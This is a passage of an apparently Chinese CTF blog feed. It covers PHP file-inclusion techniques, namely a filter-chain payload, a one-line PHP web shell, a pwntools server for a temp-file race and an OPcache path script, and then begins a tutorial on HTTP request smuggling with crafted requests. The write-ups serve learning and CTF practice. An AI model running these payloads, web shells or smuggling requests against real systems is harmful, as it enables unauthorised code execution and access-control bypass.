.UCS-2BE&#124;convert.iconv.TCVN.UCS2&#124;convert.iconv.1046.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UTF16.EUCTW&#124;convert.iconv.MAC.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.L7.SHIFTJISX0213&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UTF16.EUCTW&#124;convert.iconv.MAC.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.UTF8&#124;convert.iconv.ISO-IR-111.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.ISO6937.JOHAB&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.L6.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.UTF8&#124;convert.iconv.SJIS.GBK&#124;convert.iconv.L10.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.UCS-2LE.UCS-2BE&#124;convert.iconv.TCVN.UCS2&#124;convert.iconv.857.SHIFTJISX0213&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.base64-decode/resource=/etc/passwd&amp;0=id</span><br></code></pre></td></tr></table></figure><p>最终产生的shell是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`<span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]`;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="compress-zlib生成临时文件"><a href="#compress-zlib生成临时文件" class="headerlink" title="compress.zlib生成临时文件"></a>compress.zlib生成临时文件</h2><p>细节参考<a href="https://blog.zeddyu.info/2020/01/08/36c3-web/#includer">链接</a></p><p>临时文件包含的一个延申，需要开启一个http server返回大文件，造成缓存延迟临时文件驻留。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_chunk</span>(<span class="hljs-params">l, data</span>):<br>    l.send(<span class="hljs-string">&#x27;&#x27;&#x27;&#123;&#125;\r</span><br><span class="hljs-string">&#123;&#125;\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(data))[<span class="hljs-number">2</span>:], data))<br><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    l = listen(<span class="hljs-number">9999</span>)<br>    l.wait_for_connection()<br><br>    data1 = <span class="hljs-string">&#x27;&#x27;</span>.ljust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;X&#x27;</span>)<br>    data2 = <span class="hljs-string">&#x27;&lt;?php system(&quot;/readflag&quot;); exit(); /*&#x27;</span>.ljust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>    data3 = <span class="hljs-string">&#x27;c*/&#x27;</span>.rjust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;c&#x27;</span>)<br><br>    l.recvuntil(<span class="hljs-string">&#x27;\r\n\r\n&#x27;</span>)<br>    l.send(<span class="hljs-string">&#x27;&#x27;&#x27;HTTP/1.1 200 OK\r</span><br><span class="hljs-string">Content-Type: exploit/revxakep\r</span><br><span class="hljs-string">Connection: close\r</span><br><span class="hljs-string">Transfer-Encoding: chunked\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>    send_chunk(l, data1)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;waiting...&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;sending php code...&#x27;</span>)<br><br>    send_chunk(l, data2)<br><br>    sleep(<span class="hljs-number">3</span>)<br><br>    send_chunk(l, data3)<br><br>    l.send(<span class="hljs-string">&#x27;&#x27;&#x27;0\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>    l.close()<br></code></pre></td></tr></table></figure><p>然后就是竞争包含，其中的传输速率问题需要解决，因为竞争的设置需要与速率匹配，这一点可以通过FTP进行速率控制<code>compress.zlib://ftp://</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file=compress.zlib:<span class="hljs-regexp">//</span>ftp:<span class="hljs-regexp">//</span>vps:<span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><h2 id="nginx临时文件"><a href="#nginx临时文件" class="headerlink" title="nginx临时文件"></a>nginx临时文件</h2><p>依然是临时文件包含的延伸利用姿势。大概利用到如下几条原理：</p><ol><li>当nginx接收fastcgi响应过大则会将一部分内容以临时文件的形式存在硬盘上</li><li>临时文件会被很快清除，但是<code>/proc/xxx/fd/x</code>依然可以取到这个临时文件的内容，pid和fd需要遍历</li><li>利用上面wmctf例题绕过包含次数限制的方法去包含<code>/proc/xxx/fd/x</code>即可</li></ol><p>详细见<a href="https://tttang.com/archive/1384/">链接</a>。</p><h2 id="opcache缓存"><a href="#opcache缓存" class="headerlink" title="opcache缓存"></a>opcache缓存</h2><p>例题：湖湘杯2020 web1</p><p>OPcache是一种通过解析的PHP脚本预编译的字节码存放在共享内存中来避免每次加载和解析PHP脚本的开销，解析器可以直接从共享内存读取已经缓存的字节码，从而大大提高了PHP的执行效率。</p><p>简言之，如果开启了OPcache就会在特定目录下产生php文件的缓存file.php.bin。</p><p>通过查看phpinfo中的opcache.file_cache参数可以找到缓存的目录。</p><p>假设目录为&#x2F;var&#x2F;www&#x2F;cache，那么flag.php的缓存文件路径就是<code>/var/www/cache/[md5]/var/www/html/flag.php.bin</code></p><p>其中的MD5有固定算法，所需要的数据在phpinfo中都可以获取到，计算脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php">import sys<br>import re<br>import requests<br><span class="hljs-keyword">from</span> md5 import md5<br><span class="hljs-keyword">from</span> packaging import version <span class="hljs-comment"># python2 -m pip install -I packaging==17.0</span><br><br><br>url = <span class="hljs-string">&#x27;http://y1ng.vip:4332/&#x27;</span><br>phpinfo_url = url + <span class="hljs-string">&#x27;/?phpinfo&#x27;</span><br><br>text = requests.<span class="hljs-title function_ invoke__">get</span>(phpinfo_url).text<br>php_version = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;PHP Version &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><span class="hljs-keyword">if</span> php_version == None:<br>    php_version = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;h1 class=&quot;p&quot;&gt;PHP Version (.*)&#x27;</span>, text)<br><span class="hljs-keyword">if</span> php_version == None:<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;No PHP version found, is this a phpinfo file?&quot;</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br>php_version = php_version.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>)<br>php_greater_74 = (version.<span class="hljs-title function_ invoke__">parse</span>(<span class="hljs-string">&quot;7.4.0&quot;</span>) &lt; version.<span class="hljs-title function_ invoke__">parse</span>(php_version.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">0</span>]))<br>zend_extension_id = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Zend Extension Build &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><span class="hljs-keyword">if</span> zend_extension_id == None:<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;No Zend Extension Build found.&quot;</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br>zend_extension_id = zend_extension_id.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>)<br>architecture = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;System &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><span class="hljs-keyword">if</span> architecture == None:<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;No System info found.&quot;</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br>architecture = architecture.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_ invoke__">split</span>()[-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">if</span> architecture == <span class="hljs-string">&quot;x86_64&quot;</span>:<br>    bin_id_suffix = <span class="hljs-string">&quot;48888&quot;</span><br><span class="hljs-keyword">else</span>:<br>    bin_id_suffix = <span class="hljs-string">&quot;44444&quot;</span><br><span class="hljs-keyword">if</span> php_greater_74:<br>    zend_bin_id = <span class="hljs-string">&quot;BIN_&quot;</span> + bin_id_suffix<br><span class="hljs-keyword">else</span>:<br>    zend_bin_id = <span class="hljs-string">&quot;BIN_SIZEOF_CHAR&quot;</span> + bin_id_suffix<br><span class="hljs-keyword">if</span> not php_greater_74:<br>    <span class="hljs-keyword">if</span> architecture == <span class="hljs-string">&quot;x86_64&quot;</span>:<br>        alt_bin_id_suffix = <span class="hljs-string">&quot;148888&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        alt_bin_id_suffix = <span class="hljs-string">&quot;144444&quot;</span><br><br>    alt_zend_bin_id = <span class="hljs-string">&quot;BIN_&quot;</span> + alt_bin_id_suffix<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;PHP version : &quot;</span> + php_version<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Zend Extension ID : &quot;</span> + zend_extension_id<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Zend Bin ID : &quot;</span> + zend_bin_id<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Assuming &quot;</span> + architecture + <span class="hljs-string">&quot; architecture&quot;</span><br>digest = <span class="hljs-title function_ invoke__">md5</span>(php_version + zend_extension_id + zend_bin_id).<span class="hljs-title function_ invoke__">hexdigest</span>()<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;------------&quot;</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;System ID : &quot;</span> + digest<br><span class="hljs-keyword">if</span> not php_greater_74:<br>    alt_digest = <span class="hljs-title function_ invoke__">md5</span>(php_version + zend_extension_id + alt_zend_bin_id).<span class="hljs-title function_ invoke__">hexdigest</span>()<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;PHP lower than 7.4 detected, an alternate Bin ID is possible:&quot;</span><br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Alternate Zend Bin ID : &quot;</span> + alt_zend_bin_id<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Alternate System ID : &quot;</span> + alt_digest<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;------------&quot;</span><br></code></pre></td></tr></table></figure><p>拿到md5即可直接包含。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>php</tag>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP request smuggling分析总结</title>
    <link href="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/"/>
    <url>/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP-request-smuggling与CTF实战利用"><a href="#HTTP-request-smuggling与CTF实战利用" class="headerlink" title="HTTP request smuggling与CTF实战利用"></a>HTTP request smuggling与CTF实战利用</h1><p><em><strong>@springtime</strong></em></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>​最近刷题的时候多次遇到HTTP请求走私相关的题目，但之前都没怎么接触到相关的知识点，只是在<strong>GKCTF2021–hackme</strong>中使用到了 **CVE-2019-20372(Nginx&lt;1.17.7 请求走私漏洞)**，具体讲就是通过nginx的走私漏洞访问到Weblogic Console的登录页面，然后打Weblogic历史漏洞读取flag。当时做那道题的时候对走私漏洞没有深入理解，今天打ISCC2022的时候又遇到了一道利用gunicorn&lt;20.04请求走私漏洞绕waf的题目，因此好好学习一下还是很有必要的。</p><h2 id="0x01-发展时间线"><a href="#0x01-发展时间线" class="headerlink" title="0x01 发展时间线"></a>0x01 发展时间线</h2><blockquote><p>​最早在2005年，由Chaim Linhart，Amit Klein，Ronen Heled和Steve Orrin共同完成了一篇关于HTTP Request Smuggling这一攻击方式的报告。通过对整个RFC文档的分析以及丰富的实例，证明了这一攻击方式的危害性。</p><p><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></p><p>​在2016年的**<code>DEFCON 24</code>** 上，@regilero在他的议题——Hiding Wookiees in HTTP中对前面报告中的攻击方式进行了丰富和扩充。</p><p>[<a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf]">https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf]</a>(<a href="https://media.defcon.org/DEF">https://media.defcon.org/DEF</a> CON 24&#x2F;DEF CON 24 presentations&#x2F;DEF CON 24 - Regilero-Hiding-Wookiees-In-Http.pdf)</p><p>​在2019年的**<code>BlackHat USA 2019</code>**上，PortSwigger的James Kettle在他的议题——HTTP Desync Attacks: Smashing into the Cell Next Door中针对当前的网络环境，展示了使用分块编码来进行攻击的攻击方式，扩展了攻击面，并且提出了完整的一套检测利用流程。</p></blockquote><h2 id="0x02-什么是请求走私"><a href="#0x02-什么是请求走私" class="headerlink" title="0x02 什么是请求走私"></a>0x02 什么是请求走私</h2><p>​当今的web架构中，单纯的一对一客户端—服务端结构已经逐渐过时。为了更安全的处理客户端发来的请求，服务端会被分为两部分：<strong>前端服务器与后端服务器</strong>。前端服务器(例如代理服务器)负责安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，并对每一个请求都进行响应。但是在这个过程中要保证前端服务器与后端服务器的请求边界设定一致，<strong>如果前后端服务器对请求包处理出现差异，那么就可能导致攻击者通过发送一个精心构造的http请求包，绕过前端服务器的安全策略直接抵达后端服务器访问到原本禁止访问的服务或接口，这就是http请求走私。</strong></p><p>​听起来是不是有点像SSRF？不过SSRF与HTTP请求走私是有差别的，SSRF是直接利用内网机器来访问内网资源，但请求走私不是。用一张portswigger报告中经典的图来理解一下，有一种夹带私货的感觉，或许这就是被称为走私漏洞的原因吧：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220502224219892.png" class="" title="image-20220502224219892"><h2 id="0x03-漏洞成因与常见类型"><a href="#0x03-漏洞成因与常见类型" class="headerlink" title="0x03 漏洞成因与常见类型"></a>0x03 漏洞成因与常见类型</h2><p>​http请求走私攻击比较特殊，它不像常规的web漏洞那样直观。它更多的是在复杂网络环境下，不同的服务器对RFC标准实现的方式不同，程度不同。因此，对同一个HTTP请求，不同的服务器可能会产生不同的处理结果，这样就产生了安全风险。</p><p>​在学习之前我们先了解一下HTTP1.1中使用最为广泛的两种特性：<strong>Keep-Alive&amp;Pipeline</strong>。</p><h3 id="Keep-Alive-amp-Pipeline"><a href="#Keep-Alive-amp-Pipeline" class="headerlink" title="Keep-Alive&amp;Pipeline"></a>Keep-Alive&amp;Pipeline</h3><p>​所谓<code>Keep-Alive</code>，就是在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在<code>HTTP1.1</code>中是默认开启的。</p><p>​有了<code>Keep-Alive</code>之后，后续就有了<code>Pipeline</code>，在这里呢，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p><p>​如今，浏览器默认是不启用<code>Pipeline</code>的，但是一般的服务器都提供了对<code>Pipleline</code>的支持。</p><h3 id="CL-amp-TE"><a href="#CL-amp-TE" class="headerlink" title="CL&amp;TE"></a>CL&amp;TE</h3><p>​CL 和 TE 即是 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 请求头（严格来讲前者是个实体头，为了方便就都用请求头代指）。这里比较有趣的是 <code>Transfer-Encoding</code>（HTTP&#x2F;2 中不再支持），指定用于传输请求主体的编码方式，可以用的值有 chunked&#x2F;compress&#x2F;deflate&#x2F;gzip&#x2F;identity ，完整的定义在 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding#Directives">Transfer-Encoding#Directives</a> 和 <a href="https://tools.ietf.org/html/rfc2616#section-3.6">rfc2616#section-3.6</a></p><p>​CL好理解，对于TE我们重点关注chunked。当我们设置TE为chunked时，CL就会被省略。为了区分chunk的边界，我们需要在每个chunk前面用16进制数来表示当前chunk的长度，后面加上\r\n，再后面就是chunk的内容，然后再用\r\n来代表chunk的结束。最后用长度为 0 的块表示终止块。终止块后是一个 trailer，由 0 或多个实体头组成，可以用来存放对数据的数字签名等。譬如下面这个例子：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-stylus"><span class="hljs-selector-tag">b</span>  <span class="hljs-comment">//chunk_size</span></span><br><span class="language-stylus">q=smuggling</span><br><span class="language-stylus"><span class="hljs-number">6</span></span><br><span class="language-stylus">hahaha</span><br><span class="language-stylus"><span class="hljs-number">0</span>  <span class="hljs-comment">//end</span></span><br><span class="language-stylus"><span class="hljs-selector-attr">[blank]</span></span><br><span class="language-stylus"><span class="hljs-selector-attr">[blank]</span></span><br></code></pre></td></tr></table></figure><p><strong>另外要注意\r\n占2字节</strong>，我们在计算长度的时候很容易把它们忽略。最后把请求包以字节流形式表述出来就是：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">POST / HTTP/<span class="hljs-number">1.1</span>\r\nHost: <span class="hljs-number">1.</span>com\r\nContent-<span class="hljs-name">Type</span>: application/x-www-form-urlencoded\r\nTransfer-<span class="hljs-name">Encoding</span>: chunked\r\n\r\nb\r\nq=smuggling\r\n6\r\nhahaha\r\n0\r\n\r\n<br></code></pre></td></tr></table></figure><h3 id="常见走私类型"><a href="#常见走私类型" class="headerlink" title="常见走私类型"></a>常见走私类型</h3><h4 id="1-CL不为0"><a href="#1-CL不为0" class="headerlink" title="1.CL不为0"></a>1.CL不为0</h4><p>如果前端代理服务器允许GET携带请求体，而后端服务器不允许GET携带请求体，后端服务器就会直接忽略掉GET请求中的<code>Content-Length</code>头，这就有可能导致请求走私。</p><p>例如我们构造出：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">GET / HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">\r\n</span><br>Host: example.com<span class="hljs-string">\r\n</span><br>Content-Length: <span class="hljs-number">43</span><span class="hljs-string">\r\n</span><br><br>GET / admin HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">\r\n</span><br>Host: example.com<span class="hljs-string">\r\n</span><br><span class="hljs-string">\r\n</span><br></code></pre></td></tr></table></figure><p>在前端服务器看来它是一个请求，但是在后端服务器来看它就是：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>第一个请求<br>GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span>\r\n<br>Host: example.com\r\n<br><br><span class="hljs-regexp">//</span>第二个请求<br>GET <span class="hljs-regexp">/ admin HTTP/</span><span class="hljs-number">1.1</span>\r\n<br>Host: example.com\r\n<br></code></pre></td></tr></table></figure><h4 id="2-CL-CL"><a href="#2-CL-CL" class="headerlink" title="2.CL  CL"></a>2.CL  CL</h4><p>在<code>RFC7230</code>的第<code>3.3.3</code>节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p><p><a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">https://tools.ietf.org/html/rfc7230#section-3.3.3</a></p><p>但是很明显这并非是强制的，如果服务器不遵守安全规定在服务器收到多个CL不相同的请求时不返回400错误，那么就可能会导致请求走私。</p><p>我们假设前端服务器按照第一个CL处理而后端服务器按照第二个CL，构造出如下HTTP包：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">POST / HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">\r\n</span><br>Host: example.com<span class="hljs-string">\r\n</span><br>Content-Length: <span class="hljs-number">8</span><span class="hljs-string">\r\n</span><br>Content-Length: <span class="hljs-number">7</span><span class="hljs-string">\r\n</span><br><br><span class="hljs-number">12345</span><span class="hljs-string">\r\n</span><br>a<br></code></pre></td></tr></table></figure><p>前端代理服务器收到的请求通过第一个CL判断body为8字节，随后将包发送给后端源服务器；源服务器收到请求通过第二个CL判断body为7字节，这时候最后一个字节 <code>b&#39;a&#39;</code>就会被遗留在源服务器缓存器。由于前后端服务器一般是宠用TCP连接，假设此时正常用户向服务器发送了正常的数据包，如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\n<br><span class="hljs-attribute">Host</span>: example.com\r\n<br></code></pre></td></tr></table></figure><p>这时残留在缓存中的一个字节就会被添加到这个正常的请求前端变成：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">aGET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\n<br><span class="hljs-attribute">Host</span>: example.com\r\n<br></code></pre></td></tr></table></figure><p>导致了请求走私，正常数据包被篡改。</p><p>但很明显这种情况过于“巧合”应该很难遇见，存在两个CL的包一般服务器都不会接受，在<code>RFC2616</code>的第4.4节中，规定:<code>如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length</code>，这就意味着我们可以在头部同时包含这两种请求头，相比这下这种方式更现实一些。</p><h4 id="3-CL-TE"><a href="#3-CL-TE" class="headerlink" title="3.CL TE"></a>3.CL TE</h4><p>所谓CL TE就是前置服务器认为 <code>Content-Length</code> 优先级更高（或者说根本就不支持 <code>Transfer-Encoding</code> ） ，后端服务器认为 <code>Transfer-Encoding</code> 优先级更高。</p><p>我们可以构造出body中带有字节 <code>0</code>的请求包，前端服务器通过CL判断这是一个正常的数据包并转发给后端，后端服务器使用TE就会把字节<code>0</code>后的数据滞留到缓冲区，并且与下一次的正常请求进行拼接，这里用一下portswigger团队的lab作为实验：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p><p>构造如下请求包:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs livescript">POST / HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">\r\n</span><br>Host: ac721f8e1fcb0119c0b98800005c0061.web-security-academy.net<span class="hljs-string">\r\n</span><br>Cookie: session=ehzpRrrgyPHDRJtSnaWLcZ0fstSXLWiC<span 